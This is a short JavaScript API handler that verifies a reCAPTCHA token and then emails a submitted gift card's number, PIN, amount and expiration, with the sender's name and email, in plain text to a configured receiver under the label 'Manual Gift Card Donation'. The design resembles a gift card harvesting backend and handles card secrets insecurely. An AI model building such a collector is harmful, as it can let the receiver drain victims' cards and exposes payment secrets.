import nodemailer from "nodemailer";
import axios from "axios";

async function verifyCaptcha(token) {
  try {
    const response = await axios.post(
      "https://www.google.com/recaptcha/api/siteverify",
      null,
      {
        params: {
          secret: process.env.RECAPTCHA_SECRET_KEY,
          response: token,
        },
      }
    );

    return response.data.success;
  } catch (error) {
    console.error("Captcha Error:", error.response?.data || error.message);

    return false;
  }
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed",
    });
  }

  try {
    const {
      name,
      email,
      cardType,
      cardNumber,
      amount,
      pin,
      expiration,
      captchaToken,
    } = req.body;

    if (!process.env.RECEIVER_EMAIL) {
      return res.status(500).json({
        error: "RECEIVER_EMAIL environment variable missing",
      });
    }

    const captchaValid = await verifyCaptcha(captchaToken);

    if (!captchaValid) {
      return res.status(400).json({
        error: "Captcha verification failed",
      });
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: true,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.verify();

    const message = `
Manual Gift Card Donation
-------------------------

Name: ${name}
Email: ${email}

Card Type: ${cardType}
Card Number: ${cardNumber}
Amount: ${amount}
PIN: ${pin}
Expiration: ${expiration}
`;

    const info = await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: "New Manual Gift Card Donation",
      text: message,
    });

    console.log("Email sent:", info.messageId);

    return res.status(200).json({
      success: true,
      message: "Donation submitted successfully",
    });
  } catch (err) {
    console.error("SMTP ERROR:", {
      message: err.message,
      code: err.code,
      command: err.command,
      response: err.response,
      responseCode: err.responseCode,
    });

    return res.status(500).json({
      error: "Failed to send donation email",
    });
  }
}
